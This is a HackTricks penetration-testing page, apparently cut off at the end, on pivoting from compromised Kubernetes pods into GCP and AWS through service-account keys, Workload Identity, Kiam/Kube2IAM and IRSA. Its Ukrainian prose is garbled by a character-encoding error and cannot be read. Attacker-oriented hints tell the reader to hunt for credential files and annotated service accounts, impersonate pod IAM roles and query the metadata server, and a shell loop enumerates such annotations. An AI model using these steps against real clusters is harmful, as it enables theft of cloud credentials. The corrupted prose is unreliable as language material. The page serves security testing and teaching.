# –ü–µ—Ä–µ—Ö—ñ–¥ –≤ —Ö–º–∞—Ä–∏ Kubernetes

<details>

<summary><strong>–í–∏–≤—á—ñ—Ç—å —Ö–∞–∫—ñ–Ω–≥ AWS –≤—ñ–¥ –Ω—É–ª—è –¥–æ –≥–µ—Ä–æ—è –∑</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

–Ü–Ω—à—ñ —Å–ø–æ—Å–æ–±–∏ –ø—ñ–¥—Ç—Ä–∏–º–∫–∏ HackTricks:

* –Ø–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏ –≤–∞—à—É **–∫–æ–º–ø–∞–Ω—ñ—é —Ä–µ–∫–ª–∞–º–æ–≤–∞–Ω—É –≤ HackTricks** –∞–±–æ **–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ HackTricks —É —Ñ–æ—Ä–º–∞—Ç—ñ PDF**, –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ü–õ–ê–ù–ò –ü–Ü–î–ü–ò–°–ö–ò**](https://github.com/sponsors/carlospolop)!
* –û—Ç—Ä–∏–º–∞–π—Ç–µ [**–æ—Ñ—ñ—Ü—ñ–π–Ω–∏–π PEASS & HackTricks –º–µ—Ä—á**](https://peass.creator-spring.com)
* –í—ñ–¥–∫—Ä–∏–π—Ç–µ –¥–ª—è —Å–µ–±–µ [**–°—ñ–º'—é PEASS**](https://opensea.io/collection/the-peass-family), –Ω–∞—à—É –∫–æ–ª–µ–∫—Ü—ñ—é –µ–∫—Å–∫–ª—é–∑–∏–≤–Ω–∏—Ö [**NFT**](https://opensea.io/collection/the-peass-family)
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –º–Ω–æ—é –Ω–∞ **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **–ü–æ–¥—ñ–ª—ñ—Ç—å—Å—è —Å–≤–æ—ó–º–∏ —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞–π—Ç–µ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ GitHub.

</details>

## GCP

–Ø–∫—â–æ –≤–∏ –∑–∞–ø—É—Å–∫–∞—î—Ç–µ –∫–ª–∞—Å—Ç–µ—Ä k8s –≤ GCP, –≤–∏, –π–º–æ–≤—ñ—Ä–Ω–æ, –∑–∞—Ö–æ—á–µ—Ç–µ, —â–æ–± –¥–µ—è–∫–∞ –ø—Ä–æ–≥—Ä–∞–º–∞, —è–∫–∞ –ø—Ä–∞—Ü—é—î –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –∫–ª–∞—Å—Ç–µ—Ä–∞, –º–∞–ª–∞ –¥–æ—Å—Ç—É–ø –¥–æ GCP. –Ü—Å–Ω—É—é—Ç—å 2 –∑–∞–≥–∞–ª—å–Ω—ñ —Å–ø–æ—Å–æ–±–∏ —Ü—å–æ–≥–æ:

### –ü—ñ–¥–∫–ª—é—á–µ–Ω–Ω—è –∫–ª—é—á—ñ–≤ GCP-SA —è–∫ —Å–µ–∫—Ä–µ—Ç—É

–ó–∞–≥–∞–ª—å–Ω–∏–π —Å–ø–æ—Å—ñ–± –Ω–∞–¥–∞–Ω–Ω—è **–¥–æ—Å—Ç—É–ø—É –¥–æ –¥–æ–¥–∞—Ç–∫—É Kubernetes –¥–æ GCP** –ø–æ–ª—è–≥–∞—î –≤ –Ω–∞—Å—Ç—É–ø–Ω–æ–º—É:

* –°—Ç–≤–æ—Ä—ñ—Ç—å –æ–±–ª—ñ–∫–æ–≤–∏–π –∑–∞–ø–∏—Å —Å–ª—É–∂–±–∏ GCP
* –ü—Ä–∏–≤'—è–∂—ñ—Ç—å –¥–æ –Ω—å–æ–≥–æ –ø–æ—Ç—Ä—ñ–±–Ω—ñ –¥–æ–∑–≤–æ–ª–∏
* –ó–∞–≤–∞–Ω—Ç–∞–∂—Ç–µ json-–∫–ª—é—á —Å—Ç–≤–æ—Ä–µ–Ω–æ–≥–æ SA
* –ü—ñ–¥–∫–ª—é—á—ñ—Ç—å –π–æ–≥–æ —è–∫ —Å–µ–∫—Ä–µ—Ç –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –∫–∞–ø—Å—É–ª–∏
* –í—Å—Ç–∞–Ω–æ–≤—ñ—Ç—å –∑–º—ñ–Ω–Ω—É —Å–µ—Ä–µ–¥–æ–≤–∏—â–∞ GOOGLE\_APPLICATION\_CREDENTIALS, —è–∫–∞ –≤–∫–∞–∑—É—î —à–ª—è—Ö –¥–æ json.

{% hint style="warning" %}
–û—Ç–∂–µ, —è–∫ **–∑–ª–æ–≤–º–∏—Å–Ω–∏–∫**, —è–∫—â–æ –≤–∏ –∫–æ–º–ø—Ä–æ–º–µ—Ç—É–≤–∞–ª–∏ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –∫–∞–ø—Å—É–ª–∏, –≤–∞–º —Å–ª—ñ–¥ –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏ —Ü—é **–∑–º—ñ–Ω–Ω—É —Å–µ—Ä–µ–¥–æ–≤–∏—â–∞** —Ç–∞ **json-—Ñ–∞–π–ª–∏** –∑ –æ–±–ª—ñ–∫–æ–≤–∏–º–∏ –¥–∞–Ω–∏–º–∏ GCP.
{% endhint %}

### –ü–æ–≤'—è–∑–∞–Ω–Ω—è json GSA –∑ —Å–µ–∫—Ä–µ—Ç–æ–º KSA

–°–ø–æ—Å—ñ–± –Ω–∞–¥–∞–Ω–Ω—è –¥–æ—Å—Ç—É–ø—É GSA –¥–æ –∫–ª–∞—Å—Ç–µ—Ä–∞ GKE –ø–æ–ª—è–≥–∞—î –≤ —ó—Ö –ø—Ä–∏–≤'—è–∑—Ü—ñ —Ç–∞–∫–∏–º —á–∏–Ω–æ–º:

* –°—Ç–≤–æ—Ä—ñ—Ç—å –æ–±–ª—ñ–∫–æ–≤–∏–π –∑–∞–ø–∏—Å —Å–ª—É–∂–±–∏ Kubernetes –≤ —Ç–æ–º—É –∂ –ø—Ä–æ—Å—Ç–æ—Ä—ñ —ñ–º–µ–Ω, —â–æ –π –≤–∞—à –∫–ª–∞—Å—Ç–µ—Ä GKE –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –Ω–∞—Å—Ç—É–ø–Ω–æ—ó –∫–æ–º–∞–Ω–¥–∏:
```bash
Copy codekubectl create serviceaccount <service-account-name>
```
* –°—Ç–≤–æ—Ä—ñ—Ç—å —Å–µ–∫—Ä–µ—Ç Kubernetes, —è–∫–∏–π –º—ñ—Å—Ç–∏—Ç—å –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É —Å–ª—É–∂–±–∏ GCP, –¥–æ —è–∫–æ–≥–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –Ω–∞–¥–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ –∫–ª–∞—Å—Ç–µ—Ä–∞ GKE. –¶–µ –º–æ–∂–Ω–∞ –∑—Ä–æ–±–∏—Ç–∏ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—É –∫–æ–º–∞–Ω–¥–Ω–æ–≥–æ —Ä—è–¥–∫–∞ `gcloud`, —è–∫ –ø–æ–∫–∞–∑–∞–Ω–æ –≤ –Ω–∞—Å—Ç—É–ø–Ω–æ–º—É –ø—Ä–∏–∫–ª–∞–¥—ñ:
```bash
Copy codegcloud iam service-accounts keys create <key-file-name>.json \
--iam-account <gcp-service-account-email>
kubectl create secret generic <secret-name> \
--from-file=key.json=<key-file-name>.json
```
* –ü—Ä–∏–≤'—è–∂—ñ—Ç—å —Å–µ–∫—Ä–µ—Ç Kubernetes –¥–æ –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É —Å–ª—É–∂–±–∏ Kubernetes –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –Ω–∞—Å—Ç—É–ø–Ω–æ—ó –∫–æ–º–∞–Ω–¥–∏:
```bash
Copy codekubectl annotate serviceaccount <service-account-name> \
iam.gke.io/gcp-service-account=<gcp-service-account-email>
```
{% hint style="warning" %}
–£ **–¥—Ä—É–≥–æ–º—É –∫—Ä–æ—Ü—ñ** –±—É–ª–∏ –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω—ñ **–æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ GSA —è–∫ —Å–µ–∫—Ä–µ—Ç KSA**. –¢–æ–¥—ñ, —è–∫—â–æ –≤–∏ –º–æ–∂–µ—Ç–µ **–ø—Ä–æ—á–∏—Ç–∞—Ç–∏ —Ü–µ–π —Å–µ–∫—Ä–µ—Ç** –∑ **—Å–µ—Ä–µ–¥–∏–Ω–∏** –∫–ª–∞—Å—Ç–µ—Ä–∞ **GKE**, –≤–∏ –º–æ–∂–µ—Ç–µ **–ø—ñ–¥–Ω—è—Ç–∏—Å—è –¥–æ —Ü—å–æ–≥–æ –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É —Å–ª—É–∂–±–∏ GCP**.
{% endhint %}

### –Ü–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—è —Ä–æ–±–æ—á–æ–≥–æ –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è GKE

–ó–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –Ü–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó —Ä–æ–±–æ—á–æ–≥–æ –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –º–∏ –º–æ–∂–µ–º–æ –Ω–∞–ª–∞—à—Ç—É–≤–∞—Ç–∏ [–æ–±–ª—ñ–∫–æ–≤–∏–π –∑–∞–ø–∏—Å —Å–ª—É–∂–±–∏ Kubernetes](https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/) –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è —Ñ—É–Ω–∫—Ü—ñ–π [–æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É —Å–ª—É–∂–±–∏ Google](https://cloud.google.com/iam/docs/understanding-service-accounts). –ö–æ–Ω—Ç–µ–π–Ω–µ—Ä–∏, —â–æ –ø—Ä–∞—Ü—é—é—Ç—å –∑ –æ–±–ª—ñ–∫–æ–≤–∏–º –∑–∞–ø–∏—Å–æ–º —Å–ª—É–∂–±–∏ Kubernetes, –∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω–æ –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫—É—é—Ç—å—Å—è —è–∫ –æ–±–ª—ñ–∫–æ–≤–∏–π –∑–∞–ø–∏—Å —Å–ª—É–∂–±–∏ Google –ø—Ä–∏ –¥–æ—Å—Ç—É–ø—ñ –¥–æ API Google Cloud.

**–ü–µ—Ä—à–∞ —Å–µ—Ä—ñ—è –∫—Ä–æ–∫—ñ–≤** –¥–ª—è –∞–∫—Ç–∏–≤–∞—Ü—ñ—ó —Ü—ñ—î—ó –ø–æ–≤–µ–¥—ñ–Ω–∫–∏ - **–∞–∫—Ç–∏–≤–∞—Ü—ñ—è –Ü–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó —Ä–æ–±–æ—á–æ–≥–æ –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –≤ GCP** ([**–∫—Ä–æ–∫–∏**](https://medium.com/zeotap-customer-intelligence-unleashed/gke-workload-identity-a-secure-way-for-gke-applications-to-access-gcp-services-f880f4e74e8c)) —Ç–∞ —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è GCP SA, —è–∫–∏–π –≤–∏ —Ö–æ—á–µ—Ç–µ, —â–æ–± k8s –≤–∏–≥–ª—è–¥–∞–≤ —è–∫.
* **–ê–∫—Ç–∏–≤—É–≤–∞—Ç–∏ –Ü–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—é —Ä–æ–±–æ—á–æ–≥–æ –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è** –Ω–∞ –Ω–æ–≤–æ–º—É –∫–ª–∞—Å—Ç–µ—Ä—ñ

{% code overflow="wrap" %}
```bash
gcloud container clusters update <cluster_name> \
--region=us-central1 \
--workload-pool=<project-id>.svc.id.goog
```
{% endcode %}

* **–°—Ç–≤–æ—Ä–µ–Ω–Ω—è/–û–Ω–æ–≤–ª–µ–Ω–Ω—è –Ω–æ–≤–æ—ó –≥—Ä—É–ø–∏ –≤—É–∑–ª—ñ–≤** (–ö–ª–∞—Å—Ç–µ—Ä–∏ Autopilot –Ω–µ –ø–æ—Ç—Ä–µ–±—É—é—Ç—å —Ü—å–æ–≥–æ)

{% code overflow="wrap" %}
```bash
# You could update instead of create
gcloud container node-pools create <nodepoolname> --cluster=<cluser_name> --workload-metadata=GKE_METADATA --region=us-central1
```
{% endcode %}

* –°—Ç–≤–æ—Ä—ñ—Ç—å **–û–±–ª—ñ–∫–æ–≤–∏–π –∑–∞–ø–∏—Å —Å–ª—É–∂–±–∏ GCP –¥–ª—è —ñ–º—ñ—Ç–∞—Ü—ñ—ó** –∑ K8s –∑ –¥–æ–∑–≤–æ–ª–∞–º–∏ GCP:
```bash
# Create SA called "gsa2ksa"
gcloud iam service-accounts create gsa2ksa --project=<project-id>

# Give "roles/iam.securityReviewer" role to the SA
gcloud projects add-iam-policy-binding <project-id> \
--member "serviceAccount:gsa2ksa@<project-id>.iam.gserviceaccount.com" \
--role "roles/iam.securityReviewer"
```
{% endcode %}

* **–ü—ñ–¥–∫–ª—é—á—ñ—Ç—å—Å—è** –¥–æ **–∫–ª–∞—Å—Ç–µ—Ä–∞** —Ç–∞ **—Å—Ç–≤–æ—Ä—ñ—Ç—å** –æ–±–ª—ñ–∫–æ–≤–∏–π –∑–∞–ø–∏—Å **—Å–ª—É–∂–±–∏**, —è–∫–∏–π –ø–æ—Ç—Ä—ñ–±–Ω–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏

{% code overflow="wrap" %}
```bash
# Get k8s creds
gcloud container clusters get-credentials <cluster_name> --region=us-central1

# Generate our testing namespace
kubectl create namespace testing

# Create the KSA
kubectl create serviceaccount ksa2gcp -n testing
```
{% endcode %}

* **–ü—Ä–∏–≤'—è–∂—ñ—Ç—å GSA –¥–æ KSA**

{% code overflow="wrap" %}
```bash
# Allow the KSA to access the GSA in GCP IAM
gcloud iam service-accounts add-iam-policy-binding gsa2ksa@<project-id.iam.gserviceaccount.com \
--role roles/iam.workloadIdentityUser \
--member "serviceAccount:<project-id>.svc.id.goog[<namespace>/ksa2gcp]"

# Indicate to K8s that the SA is able to impersonate the GSA
kubectl annotate serviceaccount ksa2gcp \
--namespace testing \
iam.gke.io/gcp-service-account=gsa2ksa@security-devbox.iam.gserviceaccount.com
```
{% endcode %}

* –ó–∞–ø—É—Å—Ç—ñ—Ç—å **–ø–æ–¥** –∑ **KSA** —Ç–∞ –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ **–¥–æ—Å—Ç—É–ø** –¥–æ **GSA:**
```bash
# If using Autopilot remove the nodeSelector stuff!
echo "apiVersion: v1
kind: Pod
metadata:
name: workload-identity-test
namespace: <namespace>
spec:
containers:
- image: google/cloud-sdk:slim
name: workload-identity-test
command: ['sleep','infinity']
serviceAccountName: ksa2gcp
nodeSelector:
iam.gke.io/gke-metadata-server-enabled: 'true'" | kubectl apply -f-

# Get inside the pod
kubectl exec -it workload-identity-test \
--namespace testing \
-- /bin/bash

# Check you can access the GSA from insie the pod with
curl -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/email
gcloud auth list
```
–ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ –Ω–∞—Å—Ç—É–ø–Ω—É –∫–æ–º–∞–Ω–¥—É –¥–ª—è –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó —É —Ä–∞–∑—ñ –ø–æ—Ç—Ä–µ–±–∏:

{% code overflow="wrap" %}
```bash
gcloud auth activate-service-account --key-file=/var/run/secrets/google/service-account/key.json
```
{% endcode %}

{% hint style="warning" %}
–Ø–∫ –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫—É –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ K8s –≤–∞–º —Å–ª—ñ–¥ **—à—É–∫–∞—Ç–∏ SAs** –∑ **–∞–Ω–æ—Ç–∞—Ü—ñ—î—é `iam.gke.io/gcp-service-account`**, –æ—Å–∫—ñ–ª—å–∫–∏ —Ü–µ –≤–∫–∞–∑—É—î –Ω–∞ —Ç–µ, —â–æ SA –º–æ–∂–µ –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ —á–æ–≥–æ—Å—å —É GCP. –Ü–Ω—à–æ—é –æ–ø—Ü—ñ—î—é –±—É–¥–µ —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ –∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏ –∫–æ–∂–Ω–∏–º KSA –≤ –∫–ª–∞—Å—Ç–µ—Ä—ñ —Ç–∞ –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏, —á–∏ —î —É –Ω—å–æ–≥–æ –¥–æ—Å—Ç—É–ø.\
–ó GCP –∑–∞–≤–∂–¥–∏ —Ü—ñ–∫–∞–≤–æ –ø–µ—Ä–µ–ª—ñ—á–∏—Ç–∏ –∑–≤'—è–∑–∫–∏ —Ç–∞ –∑–Ω–∞—Ç–∏, **—è–∫–∏–π –¥–æ—Å—Ç—É–ø –≤–∏ –Ω–∞–¥–∞—î—Ç–µ SAs –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ Kubernetes**.
{% endhint %}

–¶–µ —Å–∫—Ä–∏–ø—Ç –¥–ª—è **–ª–µ–≥–∫–æ—ó —ñ—Ç–µ—Ä–∞—Ü—ñ—ó –ø–æ –≤—Å—ñ—Ö –≤–∏–∑–Ω–∞—á–µ–Ω–Ω—è—Ö –∫—ñ–ª—å–∫—ñ—Å—Ç—å** **—à—É–∫–∞—é—á–∏** —Ü—é **–∞–Ω–æ—Ç–∞—Ü—ñ—é**:
```bash
for ns in `kubectl get namespaces -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
for pod in `kubectl get pods -n "$ns" -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
echo "Pod: $ns/$pod"
kubectl get pod "$pod" -n "$ns" -o yaml | grep "gcp-service-account"
echo ""
echo ""
done
done | grep -B 1 "gcp-service-account"
```
## AWS

### Kiam & Kube2IAM (IAM-—Ä–æ–ª—å –¥–ª—è –ü–æ–¥—ñ–≤) <a href="#workflow-of-iam-role-for-service-accounts" id="workflow-of-iam-role-for-service-accounts"></a>

–°–ø–æ—Å—ñ–± (–∑–∞—Å—Ç–∞—Ä—ñ–ª–∏–π) –Ω–∞–¥–∞–≤–∞—Ç–∏ IAM-—Ä–æ–ª—ñ –ü–æ–¥–∞–º - –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ [**Kiam**](https://github.com/uswitch/kiam) –∞–±–æ [**Kube2IAM**](https://github.com/jtblin/kube2iam) **—Å–µ—Ä–≤–µ—Ä**. –û—Å–Ω–æ–≤–Ω–∞ —ñ–¥–µ—è –ø–æ–ª—è–≥–∞—î –≤ —Ç–æ–º—É, —â–æ –≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ –∑–∞–ø—É—Å—Ç–∏—Ç–∏ **daemonset** —É –≤–∞—à–æ–º—É –∫–ª–∞—Å—Ç–µ—Ä—ñ –∑ **–ø–µ–≤–Ω–æ—é –ø—Ä–∏–≤—ñ–ª–µ–π–æ–≤–∞–Ω–æ—é IAM-—Ä–æ–ª–ª—é**. –¶–µ–π daemonset –±—É–¥–µ –Ω–∞–¥–∞–≤–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ IAM-—Ä–æ–ª–µ–π –ü–æ–¥–∞–º, —è–∫—ñ –π–æ–≥–æ –ø–æ—Ç—Ä–µ–±—É—é—Ç—å.

–°–ø–æ—á–∞—Ç–∫—É –≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ –Ω–∞–ª–∞—à—Ç—É–≤–∞—Ç–∏ **—è–∫—ñ —Ä–æ–ª—ñ –º–æ–∂—É—Ç—å –±—É—Ç–∏ –¥–æ—Å—Ç—É–ø–Ω—ñ –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –ø—Ä–æ—Å—Ç–æ—Ä—É —ñ–º–µ–Ω**, —ñ –≤–∏ —Ü–µ —Ä–æ–±–∏—Ç–µ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –∞–Ω–æ—Ç–∞—Ü—ñ—ó –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –æ–±'—î–∫—Ç–∞ –ø—Ä–æ—Å—Ç–æ—Ä—É —ñ–º–µ–Ω:

{% code title="Kiam" %}
```yaml
kind: Namespace
metadata:
name: iam-example
annotations:
iam.amazonaws.com/permitted: ".*"
```
{% endcode %}

{% code title="Kube2iam" %}
```yaml
apiVersion: v1
kind: Namespace
metadata:
annotations:
iam.amazonaws.com/allowed-roles: |
["role-arn"]
name: default
```
{% endcode %}

–ü—ñ—Å–ª—è —Ç–æ–≥–æ —è–∫ –ø—Ä–æ—Å—Ç—ñ—Ä —ñ–º–µ–Ω –Ω–∞–ª–∞—à—Ç–æ–≤–∞–Ω–∏–π –∑ —Ä–æ–ª—è–º–∏ IAM, —è–∫—ñ –º–æ–∂—É—Ç—å –±—É—Ç–∏ —É –ü–æ–¥–∞—Ö, –≤–∏ –º–æ–∂–µ—Ç–µ **–≤–∫–∞–∑–∞—Ç–∏ —Ä–æ–ª—å, —è–∫—É –≤–∏ —Ö–æ—á–µ—Ç–µ –Ω–∞ –∫–æ–∂–Ω–æ–º—É –≤–∏–∑–Ω–∞—á–µ–Ω–Ω—ñ –ü–æ–¥–∞, —â–æ—Å—å –Ω–∞ –∑—Ä–∞–∑–æ–∫**:

{% code title="Kiam & Kube2iam" %}
```yaml
kind: Pod
metadata:
name: foo
namespace: external-id-example
annotations:
iam.amazonaws.com/role: reportingdb-reader
```
{% endcode %}

{% hint style="warning" %}
–Ø–∫ –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫, —è–∫—â–æ –≤–∏ **–∑–Ω–∞–π–¥–µ—Ç–µ —Ü—ñ –∞–Ω–æ—Ç–∞—Ü—ñ—ó** –≤ –∫–∞–ø—Å—É–ª–∞—Ö –∞–±–æ –ø—Ä–æ—Å—Ç–æ—Ä–∞—Ö —ñ–º–µ–Ω –∞–±–æ –∑–∞–ø—É—â–µ–Ω–∏–π —Å–µ—Ä–≤–µ—Ä kiam/kube2iam (–º–∞–±—É—Ç—å, –≤ kube-system), –≤–∏ –º–æ–∂–µ—Ç–µ **—ñ–º—ñ—Ç—É–≤–∞—Ç–∏ –∫–æ–∂–Ω—É —Ä**–æ–ª—å, —è–∫–∞ –≤–∂–µ **–≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –∫–∞–ø—Å—É–ª–∞–º–∏** —Ç–∞ –±—ñ–ª—å—à–µ (—è–∫—â–æ —É –≤–∞—Å —î –¥–æ—Å—Ç—É–ø –¥–æ –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É AWS, –ø–µ—Ä–µ–ª—ñ—á—Ç–µ —Ä–æ–ª—ñ).
{% endhint %}

#### –°—Ç–≤–æ—Ä–µ–Ω–Ω—è –∫–∞–ø—Å—É–ª–∏ –∑ —Ä–æ–ª–ª—é IAM

{% hint style="info" %}
–†–æ–ª—å IAM, —è–∫—É –ø–æ—Ç—Ä—ñ–±–Ω–æ –≤–∫–∞–∑–∞—Ç–∏, –ø–æ–≤–∏–Ω–Ω–∞ –±—É—Ç–∏ –≤ —Ç–æ–º—É –∂ –æ–±–ª—ñ–∫–æ–≤–æ–º—É –∑–∞–ø–∏—Å—ñ AWS, —â–æ –π —Ä–æ–ª—å kiam/kube2iam, —ñ —Ü—è —Ä–æ–ª—å –ø–æ–≤–∏–Ω–Ω–∞ –º–∞—Ç–∏ –¥–æ –Ω–µ—ó –¥–æ—Å—Ç—É–ø.
{% endhint %}
```yaml
echo 'apiVersion: v1
kind: Pod
metadata:
annotations:
iam.amazonaws.com/role: transaction-metadata
name: alpine
namespace: eevee
spec:
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args: ["-c", "sleep 100000"]' | kubectl apply -f -
```
### IAM –†–æ–ª—å –¥–ª—è –û–±–ª—ñ–∫–æ–≤–∏—Ö –∑–∞–ø–∏—Å—ñ–≤ —Å–ª—É–∂–± K8s —á–µ—Ä–µ–∑ OIDC <a href="#workflow-of-iam-role-for-service-accounts" id="workflow-of-iam-role-for-service-accounts"></a>

–¶–µ **—Ä–µ–∫–æ–º–µ–Ω–¥–æ–≤–∞–Ω–∏–π —Å–ø–æ—Å—ñ–± –≤—ñ–¥ AWS**.

1. –°–ø–æ—á–∞—Ç–∫—É –≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ [—Å—Ç–≤–æ—Ä–∏—Ç–∏ –ø–æ—Å—Ç–∞—á–∞–ª—å–Ω–∏–∫–∞ OIDC –¥–ª—è –∫–ª–∞—Å—Ç–µ—Ä–∞](https://docs.aws.amazon.com/eks/latest/userguide/enable-iam-roles-for-service-accounts.html).
2. –ü–æ—Ç—ñ–º —Å—Ç–≤–æ—Ä—ñ—Ç—å IAM —Ä–æ–ª—å –∑ –Ω–µ–æ–±—Ö—ñ–¥–Ω–∏–º–∏ –¥–æ–∑–≤–æ–ª–∞–º–∏ –¥–ª—è –û–±–ª—ñ–∫–æ–≤–∏—Ö –∑–∞–ø–∏—Å—ñ–≤ —Å–ª—É–∂–±.
3. –°—Ç–≤–æ—Ä—ñ—Ç—å [–¥–æ–≤—ñ—Ä—É –º—ñ–∂ IAM —Ä–æ–ª–ª—é —Ç–∞ –û–±–ª—ñ–∫–æ–≤–∏–º –∑–∞–ø–∏—Å–æ–º —Å–ª—É–∂–±–∏](https://docs.aws.amazon.com/eks/latest/userguide/associate-service-account-role.html) —ñ–º'—è (–∞–±–æ –ø—Ä–æ—Å—Ç–æ—Ä–∏ —ñ–º–µ–Ω, —è–∫—ñ –Ω–∞–¥–∞—é—Ç—å –¥–æ—Å—Ç—É–ø –¥–æ —Ä–æ–ª—ñ –≤—Å—ñ–º –û–±–ª—ñ–∫–æ–≤–∏–º –∑–∞–ø–∏—Å–∞–º —Å–ª—É–∂–±–∏ –ø—Ä–æ—Å—Ç–æ—Ä—É —ñ–º–µ–Ω). _–î–æ–≤—ñ—Ä–∞ –±—É–¥–µ –ø–µ—Ä–µ–≤—ñ—Ä—è—Ç–∏ –Ω–∞–∑–≤—É –ø–æ—Å—Ç–∞—á–∞–ª—å–Ω–∏–∫–∞ OIDC, –Ω–∞–∑–≤—É –ø—Ä–æ—Å—Ç–æ—Ä—É —ñ–º–µ–Ω —Ç–∞ –Ω–∞–∑–≤—É –û–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É —Å–ª—É–∂–±–∏_.
4. –ù–∞—Ä–µ—à—Ç—ñ, **—Å—Ç–≤–æ—Ä—ñ—Ç—å –û–±–ª—ñ–∫–æ–≤–∏–π –∑–∞–ø–∏—Å —Å–ª—É–∂–±–∏ –∑ –∞–Ω–æ—Ç–∞—Ü—ñ—î—é, —â–æ –≤–∫–∞–∑—É—î ARN —Ä–æ–ª—ñ**, —ñ –∫—ñ–ª—å–∫–∞ –∑–∞–ø—É—â–µ–Ω–∏—Ö –∑ —Ü–∏–º –û–±–ª—ñ–∫–æ–≤–∏–º –∑–∞–ø–∏—Å–æ–º —Å–ª—É–∂–±–∏ **–æ—Ç—Ä–∏–º–∞—é—Ç—å –¥–æ—Å—Ç—É–ø –¥–æ —Ç–æ–∫–µ–Ω—É —Ä–æ–ª—ñ**. **–¢–æ–∫–µ–Ω** **–∑–∞–ø–∏—Å—É—î—Ç—å—Å—è** —É —Ñ–∞–π–ª, –∞ —à–ª—è—Ö –≤–∫–∞–∑—É—î—Ç—å—Å—è –≤ **`AWS_WEB_IDENTITY_TOKEN_FILE`** (–∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º: `/var/run/secrets/eks.amazonaws.com/serviceaccount/token`)
```bash
# Create a service account with a role
cat >my-service-account.yaml <<EOF
apiVersion: v1
kind: ServiceAccount
metadata:
name: my-service-account
namespace: default
annotations:
eks.amazonaws.com/role-arn: arn:aws:iam::318142138553:role/EKSOIDCTesting
EOF
